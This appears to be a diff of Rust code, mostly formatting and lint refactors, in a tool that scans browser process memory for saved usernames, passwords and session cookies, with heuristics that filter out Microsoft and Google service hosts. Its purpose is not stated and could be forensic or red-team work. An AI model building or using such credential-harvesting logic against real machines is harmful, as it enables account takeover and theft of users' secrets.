@@ -52,7 +52,9 @@ fn harvest_at(mem: &[u8], at: usize) -> Option<PasswordTriple> {
             username: found_strings[0].1.clone(),
             password: found_strings[1].1.clone(),
         })
-    } else { None }
+    } else {
+        None
+    }
 }
 
 fn read_utf16le_until_nul(mem: &[u8], at: usize, max_chars: usize) -> Option<String> {
@@ -60,11 +62,15 @@ fn read_utf16le_until_nul(mem: &[u8], at: usize, max_chars: usize) -> Option<Str
     let mut i = at;
     while i + 2 <= mem.len() && units.len() < max_chars {
         let u = u16::from_le_bytes([mem[i], mem[i + 1]]);
-        if u == 0 { break; }
+        if u == 0 {
+            break;
+        }
         units.push(u);
         i += 2;
     }
-    if units.is_empty() { return None; }
+    if units.is_empty() {
+        return None;
+    }
     Some(String::from_utf16_lossy(&units))
 }
 
@@ -96,14 +102,14 @@ const AUTH_NOISE_HOSTS: &[&str] = &[
 /// Host suffixes that flag the URL as an internal Microsoft / chrome.dll
 /// API endpoint rather than a user-saved credential URL.
 const NOISE_HOST_SUFFIXES: &[&str] = &[
-    ".cdp.microsoft.com",          // Edge CDP / Connected Device Platform
-    ".edgesv.microsoft.com",       // Edge service backend
-    ".windows.com",                // generic MS svcs that show up in strings
-    ".microsoftonline.com",        // AAD / Office 365 backend
-    ".live.com",                   // Xbox / Live backends
-    ".googleusercontent.com",      // Google CDN / OAuth content
-    ".gstatic.com",                // Google static asset CDN
-    ".chrome.com",                 // Chrome telemetry / sync
+    ".cdp.microsoft.com",     // Edge CDP / Connected Device Platform
+    ".edgesv.microsoft.com",  // Edge service backend
+    ".windows.com",           // generic MS svcs that show up in strings
+    ".microsoftonline.com",   // AAD / Office 365 backend
+    ".live.com",              // Xbox / Live backends
+    ".googleusercontent.com", // Google CDN / OAuth content
+    ".gstatic.com",           // Google static asset CDN
+    ".chrome.com",            // Chrome telemetry / sync
     "chromewebstore.googleapis.com",
     "clients.google.com",
     "update.googleapis.com",
@@ -116,7 +122,7 @@ fn url_host(url: &str) -> &str {
 
 fn host_is_auth_noise(url: &str) -> bool {
     let host = url_host(url);
-    if AUTH_NOISE_HOSTS.iter().any(|h| host == *h) {
+    if AUTH_NOISE_HOSTS.contains(&host) {
         return true;
     }
     NOISE_HOST_SUFFIXES.iter().any(|suf| host.ends_with(suf))
@@ -138,13 +144,13 @@ fn looks_like_username(s: &str) -> bool {
         return false;
     }
     // 80%+ ASCII to reject CJK / random-bytes-as-UTF-16 noise.
-    let ascii_count = s.chars().filter(|c| c.is_ascii()).count();
+    let ascii_count = s.chars().filter(char::is_ascii).count();
     if ascii_count * 100 / s.chars().count().max(1) < 80 {
         return false;
     }
     // Real usernames are email-shaped or alphanumeric handles. Require at
     // least 3 alphanumeric chars to drop pure-punctuation strings.
-    let alnum = s.chars().filter(|c| c.is_ascii_alphanumeric()).count();
+    let alnum = s.chars().filter(char::is_ascii_alphanumeric).count();
     if alnum < 3 {
         return false;
     }
@@ -153,8 +159,7 @@ fn looks_like_username(s: &str) -> bool {
     let is_email = s.contains('@')
         && s.matches('@').count() == 1
         && s.split_once('@')
-            .map(|(local, domain)| !local.is_empty() && domain.contains('.'))
-            .unwrap_or(false);
+            .is_some_and(|(local, domain)| !local.is_empty() && domain.contains('.'));
     let is_handle = s
         .chars()
         .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '+'));
@@ -170,7 +175,7 @@ fn looks_like_password(s: &str) -> bool {
         return false;
     }
     // 80%+ ASCII to reject CJK / random-bytes-as-UTF-16 noise.
-    let ascii_count = s.chars().filter(|c| c.is_ascii()).count();
+    let ascii_count = s.chars().filter(char::is_ascii).count();
     if ascii_count * 100 / s.chars().count().max(1) < 80 {
         return false;
     }
@@ -210,7 +215,9 @@ pub struct CookieTriple {
 }
 
 /// Scan ASCII host strings (domain-looking) followed by a cookie name and
-/// value within a small window. Dedupes by `(host, name, value)` because
+/// value within a small window.
+///
+/// Dedupes by `(host, name, value)` because
 /// chrome.dll's string tables hold many copies of the same config key
 /// triples (telemetry enum values, AAD scope names, etc).
 pub fn scan_heap_for_cookies(mem: &[u8]) -> Vec<CookieTriple> {
@@ -264,15 +271,21 @@ fn read_ascii_domain(b: &[u8]) -> Option<(String, usize)> {
     let mut n = 0;
     while n < b.len() && n < 256 {
         let c = b[n];
-        if c == 0 { break; }
+        if c == 0 {
+            break;
+        }
         if !(c.is_ascii_alphanumeric() || c == b'.' || c == b'-' || c == b'_') {
             return None;
         }
         n += 1;
     }
-    if n < 4 { return None; }
+    if n < 4 {
+        return None;
+    }
     let s = std::str::from_utf8(&b[..n]).ok()?.to_string();
-    if !s.contains('.') { return None; }
+    if !s.contains('.') {
+        return None;
+    }
     Some((s, n))
 }
 
@@ -280,11 +293,17 @@ fn read_ascii_cstr(b: &[u8]) -> Option<(String, usize)> {
     let mut n = 0;
     while n < b.len() && n < 4096 {
         let c = b[n];
-        if c == 0 { break; }
-        if c < 0x20 || c > 0x7E { return None; }
+        if c == 0 {
+            break;
+        }
+        if !(0x20..=0x7E).contains(&c) {
+            return None;
+        }
         n += 1;
     }
-    if n == 0 { return None; }
+    if n == 0 {
+        return None;
+    }
     let s = std::str::from_utf8(&b[..n]).ok()?.to_string();
     Some((s, n))
 }
@@ -295,11 +314,10 @@ fn read_ascii_cstr(b: &[u8]) -> Option<(String, usize)> {
 /// many false-positive "domain-shaped" strings that turn up in process
 /// memory (function names, paths, debug strings, etc).
 const COMMON_TLDS: &[&str] = &[
-    "com", "org", "net", "io", "gov", "edu", "mil", "co", "us", "uk", "de",
-    "fr", "es", "it", "ru", "cn", "jp", "kr", "in", "br", "ca", "au", "nl",
-    "se", "no", "fi", "dk", "pl", "ch", "at", "be", "ie", "info", "biz",
-    "me", "tv", "app", "dev", "ai", "tech", "online", "site", "shop",
-    "store", "blog", "news", "cloud",
+    "com", "org", "net", "io", "gov", "edu", "mil", "co", "us", "uk", "de", "fr", "es", "it", "ru",
+    "cn", "jp", "kr", "in", "br", "ca", "au", "nl", "se", "no", "fi", "dk", "pl", "ch", "at", "be",
+    "ie", "info", "biz", "me", "tv", "app", "dev", "ai", "tech", "online", "site", "shop", "store",
+    "blog", "news", "cloud",
 ];
 
 fn host_has_common_tld(host: &str) -> bool {
@@ -308,7 +326,7 @@ fn host_has_common_tld(host: &str) -> bool {
         return false;
     };
     let tld = &host[last_dot + 1..];
-    COMMON_TLDS.iter().any(|t| *t == tld)
+    COMMON_TLDS.contains(&tld)
 }
 
 /// Returns true if `s` contains any substring that strongly suggests it's
@@ -321,7 +339,9 @@ fn contains_url_fragment(s: &str) -> bool {
     if lower.contains("://") {
         return true;
     }
-    for tld in [".com", ".net", ".org", ".io", ".co.", ".edu", ".gov", ".de.", ".fr.", ".uk.", ".cn"] {
+    for tld in [
+        ".com", ".net", ".org", ".io", ".co.", ".edu", ".gov", ".de.", ".fr.", ".uk.", ".cn",
+    ] {
         if lower.contains(tld) {
             return true;
         }
@@ -341,9 +361,10 @@ fn looks_like_cookie_name(s: &str) -> bool {
     if !(first.is_ascii_alphabetic() || first == b'_') {
         return false;
     }
-    if !s.bytes().all(|b| {
-        b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.' | b'~' | b'#' | b'$')
-    }) {
+    if !s
+        .bytes()
+        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.' | b'~' | b'#' | b'$'))
+    {
         return false;
     }
     // Reject UUID-or-domain-fragment shapes. Real cookie names never
@@ -381,8 +402,7 @@ fn host_for_noise_check(host: &str) -> &str {
 
 fn cookie_host_is_noise(host: &str) -> bool {
     let h = host_for_noise_check(host);
-    AUTH_NOISE_HOSTS.iter().any(|n| h == *n)
-        || NOISE_HOST_SUFFIXES.iter().any(|suf| h.ends_with(suf))
+    AUTH_NOISE_HOSTS.contains(&h) || NOISE_HOST_SUFFIXES.iter().any(|suf| h.ends_with(suf))
 }
 
 fn plausible_cookie(t: &CookieTriple) -> bool {
